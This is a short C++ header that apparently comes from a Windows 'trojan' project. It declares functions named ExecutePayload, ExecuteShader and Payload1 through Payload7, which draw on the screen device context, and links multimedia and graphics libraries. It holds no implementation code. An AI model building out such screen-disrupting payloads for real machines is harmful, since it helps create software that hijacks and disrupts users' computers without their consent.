#pragma once

#include <Windows.h>
#include <cmath>
#include "timer.h"
#include "virtual_screen.h"
#include "def.h"

#pragma  comment(lib,"WinMM.lib")
#pragma  comment(lib,"Msimg32.lib")

extern void SeedXorshift32(DWORD dwSeed);



extern void ExecutePayload(TROJAN_PAYLOAD payload, int nTime);

extern void Payload1(int t, HDC hdcScreen);
extern void big(int t, HDC hdcScreen);
extern void Payload2(int t, HDC hdcScreen);
extern void Payload3(int t, HDC hdcScreen);
extern void Payload4(int t, HDC hdcScreen);
extern void Payload5(int t, int w, int h, PRGBQUAD prgbScreen);
extern void ExecuteShader(TROJAN_SHADER shader, int nTime);
extern void Payload6();
extern void Payload7();
